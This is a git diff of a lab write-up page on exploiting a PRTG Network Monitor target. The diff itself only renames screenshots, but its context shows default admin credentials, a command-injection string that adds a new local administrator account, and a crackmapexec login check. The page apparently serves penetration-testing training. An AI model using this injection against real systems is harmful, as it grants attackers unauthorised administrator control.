@@ -148,11 +148,11 @@ Attack the PRTG target and gain remote code execution. Submit the contents of th
 
 login using `prtgadmin:Password123`
 
-<figure><img src="../../../.gitbook/assets/ภาพ (14).png" alt=""><figcaption><p><code>test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add</code></p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/ภาพ (16).png" alt=""><figcaption><p><code>test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add</code></p></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/ภาพ (6).png" alt=""><figcaption><p>click the bell icon</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/ภาพ (14).png" alt=""><figcaption><p>click the bell icon</p></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/ภาพ (8).png" alt=""><figcaption><p>done</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/ภาพ (15).png" alt=""><figcaption><p>done</p></figcaption></figure>
 
 ```
 sudo crackmapexec smb 10.129.249.52 -u prtgadm1 -p Pwn3d_by_PRTG! 
